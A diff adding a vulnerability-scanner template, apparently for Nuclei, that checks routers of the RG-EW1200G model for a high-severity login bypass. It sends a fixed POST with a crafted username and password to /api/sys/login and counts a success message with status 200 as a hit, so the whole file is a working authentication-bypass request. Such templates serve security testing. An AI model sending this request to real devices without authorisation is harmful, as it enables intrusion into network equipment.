@@ -1,0 +1,30 @@
+id: RG-EW1200G-login-LoginByPass
+
+info:
+  name: RG-EW1200G-login-LoginByPass
+  author: iSee857
+  severity: high
+  description: RG-EW1200G-login-LoginByPass
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /api/sys/login HTTP/1.1
+        Host: {{Host}}
+        Content-type: application/json
+        Accept: */*
+        Connection: close
+
+        {"username":"2","password":"1111","timestamp":1747047109000}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "登入成功"
+          - "ok"
+
+      - type: status
+        status:
+          - 200
